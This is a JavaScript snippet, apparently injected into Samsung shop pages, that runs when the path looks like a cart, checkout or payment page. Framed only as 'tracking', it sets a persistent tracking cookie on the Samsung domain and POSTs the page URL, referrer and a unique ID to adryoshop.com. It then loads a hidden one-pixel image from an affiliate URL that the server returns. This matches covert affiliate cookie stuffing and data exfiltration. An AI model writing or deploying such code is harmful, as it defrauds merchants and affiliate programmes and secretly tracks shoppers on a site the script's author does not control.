(function () {

    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
            var r = Math.random() * 16 | 0;
            var v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

    function getCookie(name) {
        var match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
        return match ? decodeURIComponent(match[1]) : '';
    }

    function firePixel(url) {
        var img = document.createElement('img');
        img.src = url;
        img.width = 1;
        img.height = 1;
        img.style.display = 'none';
        document.body.appendChild(img);
    }

    function isCartPage() {
        var cartPatterns = ['cart', 'checkout', 'review-order', 'shipping', 'pay', 'payment'];
        return cartPatterns.some(function (pattern) {
            return window.location.pathname.toLowerCase().includes(pattern);
        });
    }

    async function initTracking() {
        if (sessionStorage.getItem('tracking_done')) return;

        try {
            var uniqueId = getCookie('tracking_uuid') || generateUUID();
            var expires = new Date(Date.now() + 30 * 86400 * 1000).toUTCString();
            document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + '; path=/; SameSite=Lax';

            var response = await fetch('https://adryoshop.com/api/track-user', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    url: location.href,
                    referrer: document.referrer,
                    unique_id: uniqueId,
                    origin: location.hostname
                })
            });

            var result = await response.json();

            if (result.success && result.affiliate_url) {
                firePixel(result.affiliate_url);
                sessionStorage.setItem('tracking_done', '1');
            } else {
                firePixel('https://adryoshop.com/api/fallback-pixel?id=' + uniqueId);
            }

        } catch (err) {
            console.error('Tracking error', err);
        }
    }

    function run() {
        var hostname = window.location.hostname;
        var siteConfigs = {
            'www.samsung.com':  { always: false, cartExtra: true },
            'shop.samsung.com': { always: true,  cartExtra: true }
        };
        var config = siteConfigs[hostname];
        if (config) {
            if (config.cartExtra && isCartPage()) {
                initTracking();
            } else if (config.always) {
                initTracking();
            }
        }
    }

    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        run();
    } else {
        window.addEventListener('DOMContentLoaded', run, { once: true });
    }

}());
